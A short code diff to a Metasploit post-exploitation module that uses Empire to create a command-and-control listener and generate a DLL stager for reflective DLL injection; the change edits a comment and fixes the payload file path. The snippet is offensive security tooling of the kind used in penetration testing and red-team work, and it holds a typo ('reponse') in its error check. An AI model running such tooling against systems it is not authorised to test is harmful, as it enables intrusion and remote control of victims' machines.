@@ -51,14 +51,14 @@ class MetasploitModule < Msf::Post
     #Creating the Empire Object
     client_emp = Msf::Empire::Client.new('msf-empire', 'msf-empire')
 
-    #Creating a random listener which will destroyed after session)
+    #Creating a listener which will be destroyed after session)
     listener_name = "Listener_Emp"
     response = client_emp.create_listener(listener_name, lport)
     raise reponse.to_s if response.to_s.include?("error")
     print_status(response)
 
     #Creating the DLL for reflective DLL injection
-    payload_path = "/tmp/launcher#{rand_no}.dll"
+    payload_path = "/tmp/launcher-emp.dll"
     print_status("Creating DLL for injection")
     client_emp.gen_stager(listener_name,"launcher/dll", payload_path)
 
